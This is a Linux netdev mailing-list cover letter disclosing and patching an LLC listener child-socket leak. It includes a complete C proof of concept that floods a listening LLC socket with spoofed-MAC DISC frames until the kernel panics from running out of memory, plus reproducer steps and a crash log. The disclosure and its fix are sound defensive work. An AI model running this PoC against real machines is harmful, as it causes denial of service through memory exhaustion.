Received: from mail-pf1-f178.google.com (mail-pf1-f178.google.com [209.85.210.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 47C2F13A3F7
	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 17:29:24 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.178
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1784827765; cv=none; b=NImCzB0znHh5NlPVr3WMtjwK+tKZITv6yIL4mHGbjQ0bsHF76DykqsJJsRQF6l50tfh2NivbhxtZ6sAFpLcz9TMJtk/uVR8hhdfSLTg+Y8rlhiNznZ7UDxK5vto8dxntoOYdF80ME+/h7LtLIb9xNB8CfSekKazArkfj058a620=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1784827765; c=relaxed/simple;
	bh=yqz3yOiG7wbdwzJrR1DAsxD7lfBa3X6ULun3HHGaM0I=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=VtMN9B/KFg6CExQI3dJsitIG94ZSPuPuzHKjbU8XPx6SfCGWCUyLzlpcHzhMAQfcySGQd/MKcTh+ogYEXLMFUGGzKg2tzpBzb/whpXyxvbdb/LpmiGoMNOY+sToA3aREiDocm/28tPhmYcvjaM+g4QI3m05Wvt1LfZFzvu7I2Eg=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=G2j/KTFw; arc=none smtp.client-ip=209.85.210.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="G2j/KTFw"
Received: by mail-pf1-f178.google.com with SMTP id d2e1a72fcca58-84830c774a0so1169637b3a.1
        for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 10:29:24 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1784827763; x=1785432563; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=RJTypZEWowTSx+SKF46H4gBwSZIU91rpirXUxHR/1R4=;
        b=G2j/KTFwok7B9BZneuiUt3HFz7W2aJ9+V+27Xc8Yk+TRO69W2o5DHcSEbTiJQra9ny
         +JKJLVCnPs/25iP2UvV/d2bEkBfRUOxbFT/KT9TQi3Z2cZ2PWISCV3KfhiYSqJVvv+fX
         fSy3OBHzCsDeMhI/Pt+cZF14ddjToKS264xYm/1CciKUdWfLUtq4aFwGihK9BAuJBQ47
         HiUybrbGcsYUT3bHqRanDVN1uIvJ8Pr8Wm5PvAAnTAtH0nq5bR1bwtt27fFEhbQupV2O
         jbKhpDpUkXi/Hj6djwX0a62Et1aBtWJLd79KOOz4o3OUT/Uhe2OdQMdsi6Sj+FUwZiHB
         jdLA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1784827763; x=1785432563;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=RJTypZEWowTSx+SKF46H4gBwSZIU91rpirXUxHR/1R4=;
        b=dSvi05+PH7xFNwW1mA4Wo+Wa7x7eOWA0VnhTXHjz8PL1beKQrPQMxmmYUzrpOw+rJL
         Cd8z0RSneL4hxjciCScXfR7fyv8LJdgX9LXeH+kX7Q6QAHxVpei1ljuA7Cz/bSY8ynp2
         qHM88wMDK7K7d2K6HEOmD8cU8f11lMs6woOvmygTTUKO4j/TcVQnNHwRrBxGgJJvcepe
         0TqZ62rDs27S6I57wZFZZMdwNii2Ck50faQu2gPAAg7e3kBIXT4ZRB0aMpe3tx5uJtry
         3zA2XwAvPk8N0J2K3wzgp+V1/fO5R8PvEEhiNtLvy8mwHPFatE0Ff3RVtoykpyt0MZTl
         lROw==
X-Gm-Message-State: AOJu0YxOCi2+u3IPVRCW/h9Lc2ZewMTJOKejJWKcA2lqJt48p0ZiLecZ
	Yne9mQrYbF3HFNAbp5SW/SeOVu38OnIbjW0UKJssHzuvUudmw1cnR4gVBNJIUSrCufc=
X-Gm-Gg: AR+sD12qwANOHL6CeHDnX05gglOqJSR3DRQ0tllCVTOP5562faa+HzKkRN91ED/roA6
	BA84Sydup0wnwPDGu1STba7183mfXoWteNdGWvYTPWgZaYHXbmd9ZhcBpMpKz+Rgn0f3MJ0vXLt
	LMVw+ptz08P/o7QFPvDhRkSYPcQ7YlPJa+ILi3hWl9Il3+lSQJo2hmSz1ENt2V6CA1T5wrfWwza
	txz9XvNWHNYk/aV57YUFc4HWtEU4CMGFbEd94IhBf+ROJIdm3O8MtLQQYWZT5d3Wh3ytMkGdfJX
	226dnawha5AoVZbIpEFIpUWb0q3bXzb80fBzcViqnPTU8BYX4vX7azjz8sTRp1zAgrLi8KGy9LA
	vA6CxJu5KHVxl7K2MBYoq/bnFDnlNi2n/JX73kjcwWyyWhKvLg/ZvKBdwYMR1ZtlEkQMTsEGWg9
	nHH6C2A2aocBf3Hq01GbDbUZMOMC/zvA==
X-Received: by 2002:a05:6a00:3a0f:b0:847:9c06:2bef with SMTP id d2e1a72fcca58-84e2b8c1cb6mr4656288b3a.29.1784827763363;
        Thu, 23 Jul 2026 10:29:23 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-84e17237704sm3446098b3a.2.2026.07.23.10.29.14
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 23 Jul 2026 10:29:22 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	luoxuanqiang@kylinos.cn,
	tim.bird@sony.com,
	acme@mandriva.com,
	vega@nebusec.ai,
	xizh2024@lzu.edu.cn,
	enjou1224z@gmail.com
Subject: [PATCH net 0/1] llc: fix listener child socket leak on non-SABME frames
Date: Fri, 24 Jul 2026 01:29:08 +0800
Message-ID: <cover.1784725007.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zihan Xi <xizh2024@lzu.edu.cn>

Hi Linux kernel maintainers,

We found and validated an issue in net/llc/llc_conn.c. The bug is
reachable by root via a listening PF_LLC SOCK_STREAM socket and crafted
LLC class-2 DISC command frames. We've tested it, and it should not
affect any other functionality.

This series contains one patch:
  1/1 llc: fix listener child socket leak on non-SABME frames

We provide bug details, reproducer steps, and a crash log below.

---- details below ----

Bug details:

llc_conn_handler() creates an incoming child socket for every frame that
hits a listening LLC socket before it verifies that the frame is a real
passive-open request. Non-SABME traffic, such as DISC commands, can
therefore allocate a child socket and immediately drive it through the
ADM-state handlers instead of the passive-open path.

The child is inserted into the SAP tables by
llc_create_incoming_sock(), keeps its device reference, and is never
cleaned up by that non-passive-open path. Repeating DISC frames with
unique source MAC addresses therefore leaks LLC child sockets and memory
until the guest runs out of memory.

This patch fixes the root cause by creating an incoming child socket
only when the listener receives a SABME command.

Reproducer:

    Host:
      make -C /var/cache/linux-patch/llc-q4n-clean-src \
        O=/var/cache/linux-patch/rxrpc-b2k-build olddefconfig
      make -C /var/cache/linux-patch/llc-q4n-clean-src \
        O=/var/cache/linux-patch/rxrpc-b2k-build -j32 \
        net/llc/llc_conn.o bzImage

    Guest:
      cd /root/llc-q4n
      make
      echo 2 > /proc/sys/vm/panic_on_oom
      ip link del llc_rx0 2>/dev/null || true
      ip link add llc_rx0 type veth peer name llc_tx0
      ip link set llc_rx0 address 02:11:22:33:44:55
      ip link set llc_tx0 address 02:11:22:33:44:66
      ip link set llc_rx0 up
      ip link set llc_tx0 up
      ./poc llc_rx0 llc_tx0 110000

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define DEFAULT_REPORT_EVERY 10000ULL

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [rx_if] [tx_if] [count]\n"
		"  rx_if: LLC listener interface (default: %s)\n"
		"  tx_if: raw packet sender interface (default: %s)\n"
		"  count: number of DISC frames to send, 0 means forever\n",
		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");

	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd;

	fd = socket(AF_LLC, SOCK_STREAM, 0);
	if (fd < 0)
		die_errno("socket(AF_LLC)");

	get_if_hwaddr(ifname, mac);

	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");

	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int fd;
	int one = 1;
	int ifindex = get_ifindex(ifname);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die_errno("socket(AF_PACKET)");

	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

int main(int argc, char **argv)
{
	static unsigned char frame[ETH_ZLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_ll sll;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 0;
	uint64_t i = 1;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
		usage(argv[0]);
		return 0;
	}
	if (argc > 1)
		rx_if = argv[1];
	if (argc > 2)
		tx_if = argv[2];
	if (argc > 3) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[3], &end, 0);
		if (errno || !end || *end != '\0') {
			fprintf(stderr, "invalid count: %s\n", argv[3]);
			return EXIT_FAILURE;
		}
	}
	if (argc > 4) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst_mac, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	fprintf(stderr,
		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
	fprintf(stderr,
		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
		dst_mac[0], dst_mac[1], dst_mac[2],
		dst_mac[3], dst_mac[4], dst_mac[5]);
	fprintf(stderr,
		"sending LLC DISC commands with a unique spoofed source MAC each time\n");

	while (!count || i <= count) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);

		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");

		if (!(i % DEFAULT_REPORT_EVERY))
			fprintf(stderr, "sent=%llu\n",
				(unsigned long long)i);
		i++;
	}

	close(packet_fd);
	close(listener_fd);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

Script started on 2026-03-20 14:25:56+08:00 [COMMAND="bash ~/.agents/skills/qemu-start-linux-kernel/scripts/qemu-start-kernel.sh /home/tanyuan-cve/data/repos/linux-repos/linux-lts-v6.12.74" TERM="screen.xterm-256color" TTY="/dev/pts/182" COLUMNS="80" LINES="24"]
SSH port for this QEMU instance: 16516
QEMU pidfile: /tmp/qemu-pidfile-y7peLhwC.pid
user root, no passwd
user test_user, no passwd
ssh to the qemu:
ssh -i /home/tanyuan-cve/data/rootfs/image.id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 16516 root@localhost
ssh -i /home/tanyuan-cve/data/rootfs/image.id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 16516 test_user@localhost
scp -i /home/tanyuan-cve/data/rootfs/image.id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P 16516 $filename root@localhost:/root/
scp -i /home/tanyuan-cve/data/rootfs/image.id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -P 16516 $filename test_user@localhost:~/

Launching QEMU...
Formatting '/tmp/image-overlay-ouIAXGCW.qcow2', fmt=qcow2 cluster_size=65536 extended_l2=off compression_type=zlib size=4294967296 backing_file=/home/tanyuan-cve/data/rootfs/image.img backing_fmt=raw lazy_refcounts=off refcount_bits=16
[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled

[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3

[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[ 1665.706676][T10284] Call Trace:

[ 1665.706943][T10284]  <TASK>

[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:105 (discriminator 2)) 

[1665.707568][T10284] panic (kernel/panic.c:339 (discriminator 1)) 

[1665.707918][T10284] ? dump_header (include/linux/rcupdate.h:815 (discriminator 1) mm/oom_kill.c:455 (discriminator 1) mm/oom_kill.c:478 (discriminator 1)) 

[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:277) 


-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  llc: fix listener child socket leak on non-SABME frames

 net/llc/llc_conn.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

-- 
2.43.0
